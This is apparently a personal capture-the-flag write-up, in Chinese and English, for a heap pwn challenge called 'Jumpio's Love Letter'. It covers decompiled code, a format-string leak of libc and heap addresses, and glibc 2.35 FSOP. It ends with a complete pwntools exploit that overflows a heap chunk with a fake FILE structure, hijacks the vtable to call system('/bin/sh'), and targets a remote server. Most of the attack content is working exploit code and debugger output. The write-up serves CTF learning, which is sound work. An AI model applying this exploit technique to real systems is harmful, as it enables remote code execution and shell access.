# 1.0 Challenge
1. how to leak?
2. what is FSOP
3. where to inject?
4. how to find buffer?
# 2.0 Analysis
这个是 一个 heap base 题
```cpp
  case 1u:
	create_note();
	break;
  case 2u:
	change_note();
	break;
  case 3u:
	print_note();
	break;
  case 4u:
	delete_note();
	break;
  case 5u:
	save_notes();
	break;
  case 6u:
	exit(0);
  default:
	puts("Select a valid option");
	break;
```

重点在 save note
但是 不给 got overwrite ???
```
┌──(kali㉿kali)-[~/Desktop/CTF/smashctf/p2]
└─$ checksec --file=love_letter_patched 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   67 Symbols       No     0     
```
我的理解是我看到 FILE 就是 FSOP 
```cpp
int save_notes()
{
  FILE *v0; // rbx
  size_t v1; // rax
  FILE *v2; // rbx
  size_t v3; // rax
  int v5; // [rsp+0h] [rbp-30h]
  int v6; // [rsp+0h] [rbp-30h]
  int v7; // [rsp+0h] [rbp-30h]
  int v8; // [rsp+0h] [rbp-30h]
  int i; // [rsp+4h] [rbp-2Ch]
  char *s; // [rsp+8h] [rbp-28h]
  const char **v11; // [rsp+10h] [rbp-20h]

  v5 = 0;
  s = (char *)malloc(0x15A8u);
  fp = fopen("notes.md", "w+");
  for ( i = 0; i <= 19; ++i )
  {
    v11 = (const char **)notes[i];
    if ( !v11 )
      break;
    v6 = sprintf(&s[v5], "----------------------\n") + v5;
    v7 = sprintf(&s[v6], "## Author: %s", *v11) + v6;
    v8 = sprintf(&s[v7], "### Note: %s", v11[3]) + v7;
    v5 = sprintf(&s[v8], "----------------------\n\n") + v8;
  }
  v0 = fp;
  v1 = strlen(s);
  fwrite(s, 1u, v1, v0);
  puts("Anything else you would like to add?");
  printf("> ");
  read(0, s + 5280, 0x1F4u);
  v2 = fp;
  v3 = strlen(s + 5280);
  fwrite(s + 5280, 1u, v3, v2);
  free(s);
  fclose(fp);
  return puts("Saved notes successfully in file: notes.md");
}
```

FSOP
leak libc 
leak heap + 0x290 
找_IO_stdfile_1_lock 
找 add rdi, 0x10 ; jmp rcx
套公式
找 heap buffer offset -> chunk data size (用parseheap 来看)
save fwrite !!!!!
# 3.0 Solution

## 3.1 leak libc 
这个 好像不难 因为是 format string 
```
Choice: 1
What is the nickname of the author of this note?
> %lx
Input your note: 
> abc
Do you want to password-protect this note?(y/n)
> n
Note 2 taken successfully!

---------------
1 - Create Note
2 - Change Note
3 - Print Note
4 - Delete Note
5 - Save Notes
6 - Exit
---------------

Choice: 3
Which note do you want to see?
> 2

----------------------
Author: 7fffffffbae0
Note: abc
----------------------

```

so 只要 create author with %lx then print 就能看到了

## 3.2 what is FSOP
重新 温习一下啊
好像是 用 FILE STRUCTURE  做一个 fake FILE 然后inject 
触发得点是 fwrite fclose

## 3.3 where is the inject point ?
这里得情况是
```
fp = fopen("notes.md", "w+"); // fp 是全局变量
...
v0 = fp;
fwrite(s, 1u, v1, v0);
...
fclose(fp);
```
GPT 给的思路 就是
- **leak libc**（如通过 `print_note` 泄露 libc 指针）
- **malloc & edit note content → 写 fake FILE 结构**
- **构造 fake vtable → 将 _IO_overflow = system**
- **edit `fp` 的值 → 改为 fake FILE 地址**
- **调用 save_notes() → fwrite → 成功劫持 flow**

然后我找了 github
fake FILE STRUCTURE 有一个自己的format
https://github.com/uclaacm/lactf-archive/blob/5796d074da5314c70e58b30e93c9c75e9e7b5163/2025/pwn/library/solve.py#L113
```
2.35 GLIBC

fake_vtable = libc.sym._IO_wfile_jumps-0x18 <- 0x18 fixed
stdout = libc.sym._IO_2_1_stdout_
stdout_lock = libc.address+0x???????? <- 要找 offset

gadget = libc.address + 0x???????? <- 要找 offset
fs = FileStructure(0)
fs.flags = 0x3b01010101010101 <- 0x3b01010101010101 fixed
fs._IO_read_end = libc.sym.system
fs._IO_save_base = gadget
fs._IO_write_end = u64(b"/bin/sh\x00")
fs._lock = stdout_lock
fs._codecvt = stdout+0xb8 <- 0xb8 fixed
fs._wide_data = libc.sym._IO_wide_data_1 <- 只要是空都可以 heap+0x1000
fs.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable) <- fixed

save(bytes(fs))
```

ok 看完了 需要什么？
关键就是 stdout_lock 偏移
```
┌──(kali㉿kali)-[~/Desktop/CTF/smashctf/p2]
└─$ nm -D libc.so.6 | grep _IO_stdfile_1_lock

000000000021ba70 D _IO_stdfile_1_lock
```

关键就是 gadget 偏移
什么gadget ？
我们要的是这个
为什么需要这个 以后 再研究 heheh
```
add rdi, 0x10 ; jmp rcx

┌──(kali㉿kali)-[~/Desktop/CTF/smashctf/p2]
└─$ ROPgadget --binary libc.so.6 | grep "add rdi, 0x10 ; jmp rcx"
0x0000000000163830 : add rdi, 0x10 ; jmp rcx
```

需要的大概是 这样 然后怎样触发？
大概率是save 的时候
save 的感觉是 
```
----------------------
## Author: abc
### Note: abc
----------------------

----------------------
## Author: hihihi
### Note: mamamabbibiib
----------------------

nooooooooooooooo
```
应该是 buffer + payload 

## 3.4 how to find buffer of FILE get?
有点 玄学
buffer offset 大小是看 data 大小 所以
break create note 然后看一个note 几大
然后炸掉他的buffer size
不理0x290 kali 自带的

input 的时候是
author 
note

所以 是他的structure
0x30  ??? 可能是 meta data 
0x20 ???
0x110 -> author, note, password protected ....
```
pwndbg> parseheap
addr                prev                size                 status              fd                bk                                                                                                         
0x55555555b000      0x0                 0x290                Used                None              None
0x55555555b290      0x0                 0x30                 Used                None              None
0x55555555b2c0      0x0                 0x20                 Used                None              None
0x55555555b2e0      0x0                 0x110                Used                None              None
0x55555555b3f0      0x0                 0x30                 Used                None              None
0x55555555b420      0x0                 0x20                 Used                None              None
0x55555555b440      0x0                 0x110                Used                None 
```

所以 如果要overflow heap chunk 要知道他的 chunk data size = 0x110 = 272
## 3.5 leak heap 
为什么这边的leak heap 将奇怪的？
为什么 heap base 不是 直接0x55555555b000 要加一个 0x290?
heap_base = leak_heap - 0x400 + 0x2a0
print("heap base",hex(heap_base))

我懂答案了 break 了 再parseheap
0x55555555b000 好像是kali 带的 所以真正的 第一个chunk 1是 0x55555555b290 !!!!!
```
pwndbg> parseheap
addr                prev                size                 status              fd                bk                                                                                                         
0x55555555b000      0x0                 0x290                Used                None              None
0x55555555b290      0x0                 0x30                 Used                None              None
0x55555555b2c0      0x0                 0x20                 Used                None              None
0x55555555b2e0      0x0                 0x110                Used                None              None
0x55555555b3f0      0x0                 0x30                 Used                None              None
0x55555555b420      0x0                 0x20                 Used                None              None
0x55555555b440      0x0                 0x110                Used                None              None
```

# 4.0 FLAG 
after CTF 

# 5.0 FINAL SCRIPT 
```python

# -*- coding: utf-8 -*-
from pwn import*
# context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./love_letter_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("ld-2.35.so")
exe = context.binary = ELF(pc)



scripts = """
b *save_notes+419
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s, drop=True)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

def create(name,content, password=False):
    sla("Choice: ",'1')
    sla("> ",name)
    sla("> ",content)
    sla("> ", 'y' if password else 'n')
def change(idx, name, content):
    sla("Choice: ",'2')
    sla("> ",str(idx))
    sla(": ",name)
    sla(": ", content)

def show(idx):
    sla("Choice: ",'3')
    sla("> ",str(idx))
def remove(idx):
    sla("Choice: ",'4')
    sla("> ",str(idx))
def save(name):
    sla("Choice: ",'5')
    sla("> ",name)

#dbgstart()

# leak libc
sla("Choice: ","1")
sla("> ","%lx")
sla("> ","abc")
sla("> ","n")

sla("Choice: ","3")
sla("> ","1")

ru("Author: ")
# base 0x7ffff7c00000
# leak 0x7fffffffbb10
# offset 0x83FBA40
# offset = 0x7fffffffbb10 - 0x7ffff7c00000
# print("offset",hex(offset))

leak = rc(12)
leak_stack = int(leak, 16)
print("leak",hex(leak_stack))
lib_base = leak_stack - 0x83fbb10
libc.address = lib_base
print("libc base",hex(lib_base))

# leak heap
sla("Choice: ","1")
sla("> ","%7$p")
sla("> ","ddd")
sla("> ","n")

sla("Choice: ","3")
sla("> ","2")

ru("Author: ")
# base 0x55555555b000
# leak 0x55555555b400
# heap_offset = 0x55555555b2a0 - 0x55555555b000
# print("offset",hex(heap_offset))

leak = rc(14)
leak_heap = int(leak, 16)
print("leak",hex(leak_heap))
heap_base = leak_heap - 0x400 + 0x2a0
print("heap base",hex(heap_base))

# dbg()
# FILE EXLPOIT
# 2.35 GLIBC
stdlock = 0x000000000021ba70
add_rdi = 0x0000000000163830

system = lib_base + 0x50d60
stdout_lock = lib_base + 0x21ba70   # _IO_stdfile_1_lock  (symbol not exported)
stdout = lib_base + 0x21a780
fake_vtable = lib_base+0x2160c0-0x18
gadget = lib_base + 0x163830 # add rdi, 0x10 ; jmp rcx
fake_io = heap_base + 0x1870

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=system        # the function that we will call
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= fake_io + 0xb8
fake._wide_data = libc.sym._IO_wide_data_1
fake.unknown2=p64(0)*2+p64(fake_io+0x20)+p64(0)*3+p64(fake_vtable)

payload = b"A"*272
payload += bytes(fake)

save(payload)
# dbg()
# payload = 

ti()

```


# 6.0 REFERENCE
[[baby note FSOP]]

https://github.com/hackthebox/stack-smash-2025/blob/master/Jumpio's%20Love%20Letter/htb/solver.py

https://github.com/pwn2ooown/CTF-Writeups-Public/blob/main/2025_HTB_StackSmash_CTF/pwn_jumpios_love_letter/exp.py

参考一起看
https://github.com/uclaacm/lactf-archive/blob/5796d074da5314c70e58b30e93c9c75e9e7b5163/2025/pwn/library/solve.py#L113